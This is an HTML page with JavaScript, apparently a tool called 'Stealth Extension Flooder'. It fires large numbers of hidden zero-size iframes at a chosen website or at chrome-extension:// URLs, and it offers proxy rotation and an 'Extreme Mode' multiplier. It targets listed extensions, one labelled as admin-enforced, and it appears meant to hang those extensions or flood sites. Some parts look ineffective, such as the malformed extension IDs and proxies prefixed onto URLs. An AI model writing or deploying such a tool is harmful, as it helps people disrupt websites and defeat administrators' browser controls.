<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stealth Extension Flooder</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #000;
      color: #fff;
      overflow-x: hidden;
    }
    h1, h3 {
      text-align: center;
      margin-top: 20px;
    }
    .container {
      width: 90%;
      max-width: 900px;
      margin: auto;
      background: #111;
      padding: 20px;
      border-radius: 8px;
      box-sizing: border-box;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input, select, button, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      border: none;
      border-radius: 5px;
      background: #222;
      color: #fff;
      font-size: 14px;
    }
    button {
      background: #333;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background: #444;
    }
    .dashboard {
      margin-top: 20px;
      background: #111;
      padding: 15px;
      border-radius: 5px;
    }
    #debugButton {
      position: fixed;
      bottom: 10px;
      right: 10px;
      width: 20px;
      height: 20px;
      background: #333;
      border-radius: 50%;
      cursor: pointer;
      opacity: 0.5;
    }
    #debugPanel {
      display: none;
      background: #000;
      padding: 10px;
      height: 300px;
      overflow-y: scroll;
      font-size: 12px;
      position: fixed;
      bottom: 40px;
      right: 10px;
      width: 300px;
      border: 1px solid #444;
    }
  </style>
</head>
<body>

<h1>Stealth Extension Flooder</h1>

<div class="container">
  <label>Target URL:</label>
  <input type="text" id="targetUrl" placeholder="https://example.com" value="https://www.wikipedia.org">

  <label>Select Extensions (Ctrl/Shift to multi-select):</label>
  <select id="extensions" multiple size="8"></select>

  <label>Number of Iframes:</label>
  <input type="number" id="iframeCount" value="50" min="1">

  <label>Delay Between Launches (ms):</label>
  <input type="number" id="delay" value="100" min="0">

  <label>Proxy List (comma-separated):</label>
  <input type="text" id="proxies" placeholder="http://proxy1.com, http://proxy2.com">

  <label>Enable Extreme Mode:</label>
  <input type="checkbox" id="extremeMode">

  <button onclick="startFlood()">Start Flooding</button>
  <button onclick="stopFlood()" style="background:#600;">Stop Flooding</button>

  <div class="dashboard">
    <h3>Flood Stats</h3>
    Frames Launched: <span id="frameCount">0</span><br>
    Errors: <span id="errorCount">0</span><br>
    Current Proxy: <span id="currentProxy">None</span><br>
    Current Target: <span id="currentTarget">None</span>
  </div>
</div>

<div id="debugButton" onclick="toggleDebug()"></div>
<div id="debugPanel"></div>

<script>
let frameCounter = 0;
let errorCounter = 0;
let flooding = false;
let proxyList = [];
let proxyIndex = 0;
let debugEnabled = false;

// List of known extensions including admin-enforced ones
const extensionTargets = [
  "chrome-extension://gighmmpiobklfepjocnamgkkbiglidom", // Adblock Plus
  "chrome-extension://pjkljhegncpnkpknbcohdijeoejaedia", // Gmail
  "chrome-extension://aapocclcgogkmnckokdopfmhonfmgoek", // Admin Forced Test
  "chrome-extension://extprint3r.github.io", // Extprint3r style
  "chrome-extension://invalidextensionhang3rtest", // Fake comet-hang3r clone
];

// Load extensions into selector
function loadExtensions() {
  const select = document.getElementById('extensions');
  extensionTargets.forEach(ext => {
    const option = document.createElement('option');
    option.value = ext;
    option.innerText = ext;
    select.appendChild(option);
  });
}

// Start flooding
function startFlood() {
  if (flooding) return;
  flooding = true;
  saveSettings();
  proxyList = document.getElementById('proxies').value.split(',').map(p => p.trim()).filter(Boolean);
  proxyIndex = 0;
  const targetUrl = document.getElementById('targetUrl').value;
  const iframeCount = parseInt(document.getElementById('iframeCount').value);
  const delay = parseInt(document.getElementById('delay').value);
  const selectedExtensions = Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value);
  const extreme = document.getElementById('extremeMode').checked;

  let totalFrames = extreme ? iframeCount * 3 : iframeCount;
  let delayMs = extreme ? delay / 2 : delay;

  for (let i = 0; i < totalFrames; i++) {
    setTimeout(() => {
      let baseTarget = (selectedExtensions.length > 0) ? randomArrayItem(selectedExtensions) : targetUrl;
      let finalTarget = (proxyList.length > 0) ? proxyList[proxyIndex++ % proxyList.length] + "/" + baseTarget : baseTarget;
      launchIframe(finalTarget);
    }, i * delayMs);
  }
}

// Stop flooding
function stopFlood() {
  flooding = false;
  debugLog("Flooding stopped.");
}

// Launch an iframe
function launchIframe(url) {
  if (!flooding) return;
  const iframe = document.createElement('iframe');
  iframe.src = url;
  iframe.style.width = "0";
  iframe.style.height = "0";
  iframe.style.border = "none";
  iframe.onload = () => {
    frameCounter++;
    updateStats(url);
  };
  iframe.onerror = () => {
    errorCounter++;
    updateStats(url);
  };
  document.body.appendChild(iframe);
  debugLog(`Launched iframe: ${url}`);
}

// Update dashboard stats
function updateStats(currentUrl) {
  document.getElementById('frameCount').innerText = frameCounter;
  document.getElementById('errorCount').innerText = errorCounter;
  document.getElementById('currentTarget').innerText = currentUrl;
  if (proxyList.length > 0) {
    document.getElementById('currentProxy').innerText = proxyList[proxyIndex % proxyList.length];
  }
}

// Debug functions
function toggleDebug() {
  const panel = document.getElementById('debugPanel');
  panel.style.display = (panel.style.display === 'none') ? 'block' : 'none';
}

function debugLog(message) {
  if (!debugEnabled) return;
  const panel = document.getElementById('debugPanel');
  const line = document.createElement('div');
  line.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
  panel.appendChild(line);
  panel.scrollTop = panel.scrollHeight;
}

// Helpers
function randomArrayItem(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Save/Load settings
function saveSettings() {
  const settings = {
    targetUrl: document.getElementById('targetUrl').value,
    proxies: document.getElementById('proxies').value,
    selectedExtensions: Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value),
    iframeCount: document.getElementById('iframeCount').value,
    delay: document.getElementById('delay').value,
    extremeMode: document.getElementById('extremeMode').checked
  };
  localStorage.setItem('flooderSettings', JSON.stringify(settings));
}

function loadSettings() {
  const saved = localStorage.getItem('flooderSettings');
  if (!saved) return;
  const settings = JSON.parse(saved);
  document.getElementById('targetUrl').value = settings.targetUrl || '';
  document.getElementById('proxies').value = settings.proxies || '';
  document.getElementById('iframeCount').value = settings.iframeCount || 50;
  document.getElementById('delay').value = settings.delay || 100;
  document.getElementById('extremeMode').checked = settings.extremeMode || false;

  const select = document.getElementById('extensions');
  Array.from(select.options).forEach(opt => {
    if (settings.selectedExtensions.includes(opt.value)) {
      opt.selected = true;
    }
  });
}

// On Load
window.onload = function() {
  loadExtensions();
  loadSettings();
  debugEnabled = true; // Always enable debug logging internally
};
</script>

</body>
</html>
